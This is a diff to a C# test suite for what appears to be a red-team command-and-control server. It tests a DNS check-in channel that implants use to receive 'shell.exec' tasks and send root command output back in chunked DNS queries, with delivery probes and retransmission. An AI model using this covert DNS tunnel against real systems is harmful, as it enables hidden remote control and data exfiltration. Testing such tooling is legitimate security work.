@@ -159,6 +159,28 @@ public class DnsCheckInTests
     }
 
     [Fact]
+    public void Grammar_DeliveryProbeRoundTrips()
+    {
+        var implant = ImplantId.New();
+        var task = TaskId.New();
+        var sha = System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes("uid=0(root)"))[..16];
+
+        var name = DnsCheckInNames.ProbeName(implant, task, sha, Zone);
+        var parsed = DnsCheckInNames.TryParseDelivery(name, Zone);
+
+        Assert.NotNull(parsed);
+        Assert.Equal(implant, parsed!.Implant);
+        Assert.Equal(task, parsed.Task);
+        Assert.Equal(sha, parsed.Sha);
+        // A wrong sha is a different question, not a parse failure -- the
+        // server's answer separates them.
+        var other = DnsCheckInNames.TryParseDelivery(
+            DnsCheckInNames.ProbeName(implant, task, new byte[16], Zone), Zone);
+        Assert.NotNull(other);
+        Assert.NotEqual(sha, other!.Sha);
+    }
+
+    [Fact]
     public void Grammar_ResultChunkRoundTrips()
     {
         var implant = ImplantId.New();
@@ -410,6 +432,83 @@ public class DnsCheckInTests
         Assert.NotEqual("Completed", plainFetched!.Status);
     }
 
+    [Fact]
+    public async Task Retransmission_AGappedChunkDropRecoversOnReSend()
+    {
+        await using var env = await DnsTestEnv.StartAsync();
+        var (implant, leafCert, leafKey) = await env.EnrollImplantAsync();
+        using var channel = env.ConnectBeacon(leafCert, leafKey);
+        var client = new Beacon.BeaconClient(channel);
+        var call = client.CheckIn();
+        await call.RequestStream.WriteAsync(HandshakeFrame(implant.Id));
+        Assert.True(await call.ResponseStream.MoveNext(TestSupport.BeaconDeadline()));
+        await call.RequestStream.CompleteAsync();
+
+        await env.LoginAsync();
+        var issued = await env.Http.PostAsJsonAsync(
+            $"/engagements/{implant.EngagementId}/tasks",
+            new { ImplantId = implant.Id.ToString(), Verb = "shell.exec", Arguments = "id" });
+        issued.EnsureSuccessStatusCode();
+        var issuedBody = await issued.Content.ReadFromJsonAsync<TaskIssuedBody>();
+
+        var pollAnswer = await env.DnsQueryAsync(DnsCheckInNames.PollName(implant.Id, Zone));
+        Assert.NotNull(pollAnswer);
+        Assert.True(DnsCheckInNames.TryDecode(pollAnswer, out var framed));
+        Assert.Equal((byte)'t', framed![0]);
+        var taskRequest = TaskRequest.Parser.ParseFrom(framed[1..]);
+        var task = Guid.TryParse(taskRequest.TaskId, out var tid) ? new TaskId(tid) : TaskId.New();
+
+        // The gapped attempt: the middle chunk never crosses, so the
+        // terminal reassembly drops whole -- the loss a datagram carrier
+        // takes in stride, reported to the sender as an unconfirmed blob.
+        var output = "uid=0(root) gid=0(root) groups=0(root)";
+        var bytes = Encoding.UTF8.GetBytes(output);
+        var chunks = Chunk(bytes, 10);
+        Assert.True(chunks.Count >= 3);
+        for (var i = 0; i < chunks.Count; i++)
+        {
+            if (i == 1)
+                continue;
+            await env.DnsQueryAsync(DnsCheckInNames.ResultName(
+                implant.Id, task, succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
+        }
+        var probe = await env.DnsQueryAsync(
+            DnsCheckInNames.ProbeName(implant.Id, task, DnsCheckInNames.DeliverySha(bytes), Zone));
+        Assert.NotNull(probe);
+        Assert.True(DnsCheckInNames.TryDecode(probe, out var notYet));
+        Assert.Equal((byte)'n', notYet![0]);
+        var early = await env.Http.GetFromJsonAsync<TaskBody>(
+            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}");
+        Assert.NotNull(early);
+        Assert.NotEqual("Completed", early!.Status);
+
+        // The full re-send lands -- first-wins recording tolerates the
+        // partial first attempt -- and the probe confirms the exact blob.
+        for (var i = 0; i < chunks.Count; i++)
+        {
+            await env.DnsQueryAsync(DnsCheckInNames.ResultName(
+                implant.Id, task, succeeded: true, sequence: i, terminal: i == chunks.Count - 1, chunks[i], Zone));
+        }
+        var fetched = await WaitUntilAsync(async () => await env.Http.GetFromJsonAsync<TaskBody>(
+            $"/engagements/{implant.EngagementId}/tasks/{taskRequest.TaskId}"));
+        Assert.NotNull(fetched);
+        Assert.Equal("Completed", fetched!.Status);
+        Assert.Equal(output, fetched.Output);
+        var confirmed = await env.DnsQueryAsync(
+            DnsCheckInNames.ProbeName(implant.Id, task, DnsCheckInNames.DeliverySha(bytes), Zone));
+        Assert.NotNull(confirmed);
+        Assert.True(DnsCheckInNames.TryDecode(confirmed, out var yes));
+        Assert.Equal((byte)'y', yes![0]);
+
+        // A different blob under the same task stays unconfirmed: the probe
+        // names the exact bytes, not just the task.
+        var other = await env.DnsQueryAsync(
+            DnsCheckInNames.ProbeName(implant.Id, task, DnsCheckInNames.DeliverySha(Encoding.UTF8.GetBytes("forged")), Zone));
+        Assert.NotNull(other);
+        Assert.True(DnsCheckInNames.TryDecode(other, out var no));
+        Assert.Equal((byte)'n', no![0]);
+    }
+
     private static List<byte[]> Chunk(byte[] bytes, int size)
     {
         var chunks = new List<byte[]>();
@@ -642,11 +741,27 @@ public class DnsCheckInTests
         /// </summary>
         public async Task<byte[]> DnsQueryRawAsync(string name, ushort type)
         {
-            var query = BuildQuery((ushort)Random.Shared.Next(1, ushort.MaxValue), name, type);
-            await _dns.SendAsync(query, query.Length);
+            // A datagram exchange is one shot: under parallel-suite load the
+            // very first send can race the listener's socket settling or its
+            // answer can trail the window. One bounded retry -- the implant's
+            /// own cycle retries the same way -- keeps the harness honest
+            // without masking a dead listener (consecutive failures still
+            // fail the test).
+            for (var attempt = 0; ; attempt++)
+            {
+                var query = BuildQuery((ushort)Random.Shared.Next(1, ushort.MaxValue), name, type);
+                await _dns.SendAsync(query, query.Length);
 
-            using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(5));
-            return (await _dns.ReceiveAsync(timeout.Token)).Buffer;
+                using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(5));
+                try
+                {
+                    return (await _dns.ReceiveAsync(timeout.Token)).Buffer;
+                }
+                catch (Exception ex) when (attempt < 2 && ex is SocketException or OperationCanceledException)
+                {
+                    await Task.Delay(100);
+                }
+            }
         }
 
         // Reads the first TXT answer's concatenated strings off a response.
